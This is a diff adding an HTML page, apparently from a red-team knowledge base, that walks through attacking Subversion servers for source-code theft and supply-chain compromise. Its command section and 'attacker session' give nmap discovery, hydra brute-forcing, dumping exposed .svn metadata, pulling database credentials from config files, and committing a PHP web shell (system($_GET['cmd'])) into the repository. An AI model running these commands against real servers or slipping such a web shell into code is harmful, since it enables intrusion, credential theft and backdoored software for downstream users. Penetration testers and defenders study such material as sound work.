@@ -1,0 +1,181 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Subversion (SVN) Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Version Control</strong> • Focus: <strong>SVN Abuse & Source Code Theft</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Apache Subversion (SVN, TCP/3690) is a centralized version control system. 
+    Misconfigured SVN servers often expose repositories without proper authentication, 
+    enabling attackers to clone source code, extract secrets, and insert backdoors. 
+    Exploitation techniques include anonymous checkout, weak password brute forcing, 
+    dumping <code>.svn</code> metadata from web servers, and privilege escalation 
+    through commit hooks. For Red Teams, SVN exploitation provides valuable 
+    intellectual property theft opportunities and initial footholds in supply-chain attacks.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Anonymous Access:</strong> Public or misconfigured repos allow unauthenticated checkout.</li>
+    <li><strong>Weak Authentication:</strong> Password brute forcing often succeeds.</li>
+    <li><strong>.svn Exposures:</strong> Web servers leak repository metadata.</li>
+    <li><strong>Commit Hooks:</strong> Writable repos let attackers add malicious commit scripts.</li>
+    <li><strong>Intellectual Property:</strong> Source code leaks expose API keys, passwords, and business logic.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify SVN service on TCP/3690 or <code>.svn</code> directories on web servers.</li>
+    <li><strong>Authentication:</strong> Test for anonymous access or brute force credentials.</li>
+    <li><strong>Enumeration:</strong> Checkout repository, extract commit history and secrets.</li>
+    <li><strong>Exploitation:</strong> Inject backdoored code or malicious hooks.</li>
+    <li><strong>Impact:</strong> Source code theft, secret exfiltration, and supply-chain compromise.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for TCP/3690 to identify Subversion servers.</li>
+    <li>Attempt anonymous or credentialed checkout.</li>
+    <li>Enumerate commit history and sensitive files.</li>
+    <li>Extract secrets from config files and code.</li>
+    <li>Abuse commit access to inject malicious code.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p3690 -sV [target]              # Scan for SVN protocol
+searchsploit subversion               # Check for known exploits
+
+# ------------------------------
+# Anonymous Access / Checkout
+# ------------------------------
+svn checkout svn://[target]/repo
+svn list svn://[target]/repo
+
+# ------------------------------
+# Brute Force Authentication
+# ------------------------------
+hydra -L users.txt -P rockyou.txt svn://[target]
+
+# ------------------------------
+# Web Exploitation (.svn exposure)
+# ------------------------------
+wget -r http://[target]/.svn/         # Dump repo metadata
+svn export .svn/text-base/            # Reconstruct files
+
+# ------------------------------
+# Repository Enumeration
+# ------------------------------
+svn log svn://[target]/repo
+svn diff -r 1:HEAD svn://[target]/repo
+svn cat svn://[target]/repo/secret.conf
+
+# ------------------------------
+# Exploitation (if commit access)
+# ------------------------------
+echo "backdoor code" >> backdoor.php
+svn commit -m "Update" backdoor.php
+    </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p3690 -sV 192.168.1.120
+PORT     STATE SERVICE VERSION
+3690/tcp open  svn     Subversion 1.9.7
+
+[ saide ~ ]$ svn list svn://192.168.1.120/repo
+trunk/
+branches/
+tags/
+
+[ saide ~ ]$ svn checkout svn://192.168.1.120/repo/trunk
+A    trunk/app.py
+A    trunk/config/db.conf
+
+[ saide ~ ]$ cat trunk/config/db.conf
+db_user=admin
+db_pass=SuperSecret2025!
+
+[ saide ~ ]$ svn log svn://192.168.1.120/repo | head -5
+r1 | dev | Initial commit with config files
+
+[ saide ~ ]$ echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+[ saide ~ ]$ svn commit -m "Added patch" shell.php
+Committed revision 5.
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Subversion exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+3690/tcp open  subversion 1.9.7
+
+# Anonymous Access
+svn checkout successful
+
+# Sensitive Data
+db_user=admin
+db_pass=SuperSecret2025!
+
+# Proof of Exploitation
+Malicious backdoor.php committed to repo
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-subversion" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Subversion
+      </a>
+    </li>
+    <li>
+      <a href="https://subversion.apache.org/security/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Apache Subversion Security Advisories
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Enum repos → Dump secrets → Backdoor commits → Supply-chain attack.</li>
+  </ul>
+</section>
